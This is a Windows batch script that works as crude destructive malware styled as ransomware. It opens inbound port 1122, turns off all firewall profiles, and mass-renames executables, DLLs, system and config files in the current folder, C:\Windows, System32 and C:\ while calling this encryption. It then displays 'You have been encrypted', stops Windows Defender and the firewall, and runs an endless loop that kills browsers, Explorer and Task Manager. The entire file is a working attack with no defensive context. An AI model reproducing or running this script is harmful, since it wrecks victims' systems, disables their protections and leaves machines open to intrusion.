goto ports
ren -=- Opens Port 1122 -=-
:ports
cls & color 0a
netsh advfirewall firewall add rule name="Port 1122 TCP" dir=in action=allow protocol=TCP localport=%1
netsh advfirewall firewall add rule name="Port 1122 UDP" dir=in action=allow protocol=UDP localport=%1
goto firewall
ren -=- Turns all Firewalls off -=-
:firewall
cls & color 0a
netsh firewall set opmode disable
netsh firewall set opmode mode=DISABLE
netsh advfirewall set currentprofile state off
netsh advfirewall set domainprofile state off
netsh advfirewall set privateprofile state off
netsh advfirewall set publicprofile state off
netsh advfirewall set allprofiles state off
goto encryption
ren -=- Encrypts files with a simple name break -=-
:encryption
cls & color 0a
:Current
REN *.cmd *.sI09
REN *.exe *.1Je9
REN *.log *.439a
REN *.ini *.3KM1
REN *.dll *.38Jl
REN *.bin *.3J81
REN *.txt *.2M1A
REN *.sys *.8j3J
REN *.lnk *.9K2M
REN *.png *.8J2n
REN *.exe *.3hxD
cd C:\Windows
REN *.cmd *.sI09
REN *.exe *.1Je9
REN *.log *.439a
REN *.ini *.3KM1
REN *.dll *.38Jl
REN *.bin *.3J81
REN *.txt *.2M1A
REN *.sys *.8j3J
REN *.lnk *.9K2M
REN *.png *.8J2n
REN *.exe *.3hxD
cd C:\Windows\Sys32 & cd C:\Windows\System32
REN *.cmd *.sI09
REN *.exe *.1Je9
REN *.log *.439a
REN *.ini *.3KM1
REN *.dll *.38Jl
REN *.bin *.3J81
REN *.txt *.2M1A
REN *.sys *.8j3J
REN *.lnk *.9K2M
REN *.png *.8J2n
REN *.exe *.3hxD
cd C:\
REN *.cmd *.sI09
REN *.exe *.1Je9
REN *.log *.439a
REN *.ini *.3KM1
REN *.dll *.38Jl
REN *.bin *.3J81
REN *.txt *.2M1A
REN *.sys *.8j3J
REN *.lnk *.9K2M
REN *.png *.8J2n
REN *.exe *.3hxD
color 0a & mode 1000 & cls
pause
goto virus
ren -=- Closes all task managers and browser, kills anti-virus and firewall -=-
:virus
ECHO You have been encrypted by *-*7_SL*- & color 0a
net stop "Windows Defender Service"
net stop "Windows Firewall"
taskkill /F /IM "chrome.exe" /T
taskkill /F /IM "firefox.exe" /T
taskkill /F /IM "ProcessHacker.exe" /T
taskkill /F /IM "explorer.exe" /T
taskkill /F /IM "taskmgr.exe" /T
goto virus
